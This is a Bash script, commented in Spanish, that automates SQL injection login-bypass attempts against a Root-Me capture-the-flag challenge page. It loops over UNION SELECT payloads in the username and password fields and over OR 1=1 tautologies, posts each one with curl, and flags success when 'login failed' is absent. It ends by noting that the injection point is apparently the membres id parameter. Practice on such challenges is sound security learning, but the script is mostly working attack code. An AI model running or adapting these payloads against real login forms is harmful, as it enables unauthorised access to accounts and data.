#!/bin/bash

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  BYPASS DE LOGIN CON UNION SELECT${NC}"
echo -e "${BLUE}========================================${NC}"

# ============================================
# MÉTODO 1: UNION SELECT en username
# ============================================

echo -e "\n${YELLOW}[+] Método 1: UNION SELECT en username${NC}"

payloads=(
    "' UNION SELECT 1,'admin','password123',4#"
    "' UNION SELECT 1,'admin','password123',4 FROM membres WHERE 1=2#"
    "' UNION ALL SELECT 1,'admin','password123',4#"
    "' UNION ALL SELECT 1,'admin','password123',4 FROM membres WHERE 1=2#"
    "' UNION SELECT 1,2,3,4#"
    "' UNION SELECT 1,2,3,4 FROM membres WHERE 1=2#"
)

for payload in "${payloads[@]}"; do
    echo -ne "  Probando username=$payload..."
    result=$(curl -s -X POST "$URL" -d "username=$payload&password=test" | grep -c "login failed")
    if [ "$result" -eq 0 ]; then
        echo -e " ${GREEN}✅ ÉXITO!${NC}"
        echo -e "    ${GREEN}Payload: username=$payload${NC}"
        exit 0
    else
        echo -e " ${RED}❌${NC}"
    fi
done

# ============================================
# MÉTODO 2: UNION SELECT en password
# ============================================

echo -e "\n${YELLOW}[+] Método 2: UNION SELECT en password${NC}"

payloads=(
    "' UNION SELECT 1,2,3,4#"
    "' UNION SELECT 1,2,3,4 FROM membres WHERE 1=2#"
    "' UNION ALL SELECT 1,2,3,4#"
    "' UNION ALL SELECT 1,2,3,4 FROM membres WHERE 1=2#"
)

for payload in "${payloads[@]}"; do
    echo -ne "  Probando password=$payload..."
    result=$(curl -s -X POST "$URL" -d "username=admin&password=$payload" | grep -c "login failed")
    if [ "$result" -eq 0 ]; then
        echo -e " ${GREEN}✅ ÉXITO!${NC}"
        echo -e "    ${GREEN}Payload: password=$payload${NC}"
        exit 0
    else
        echo -e " ${RED}❌${NC}"
    fi
done

# ============================================
# MÉTODO 3: Inyección directa con OR 1=1
# ============================================

echo -e "\n${YELLOW}[+] Método 3: Inyección directa${NC}"

payloads=(
    "' OR 1=1#"
    "' OR '1'='1"
    "' OR 1=1--"
    "' || 1=1#"
)

for payload in "${payloads[@]}"; do
    echo -ne "  Probando username=$payload..."
    result=$(curl -s -X POST "$URL" -d "username=$payload&password=test" | grep -c "login failed")
    if [ "$result" -eq 0 ]; then
        echo -e " ${GREEN}✅ ÉXITO!${NC}"
        echo -e "    ${GREEN}Payload: username=$payload${NC}"
        exit 0
    else
        echo -e " ${RED}❌${NC}"
    fi
done

# ============================================
# SI NADA FUNCIONA
# ============================================

echo -e "\n${RED}========================================${NC}"
echo -e "${RED}  NINGÚN MÉTODO FUNCIONÓ${NC}"
echo -e "${RED}========================================${NC}"
echo -e "\n${YELLOW}[!] El login no es vulnerable a UNION SELECT.${NC}"
echo -e "${YELLOW}[!] La inyección está en ?action=membres&id=, pero no en el login.${NC}"
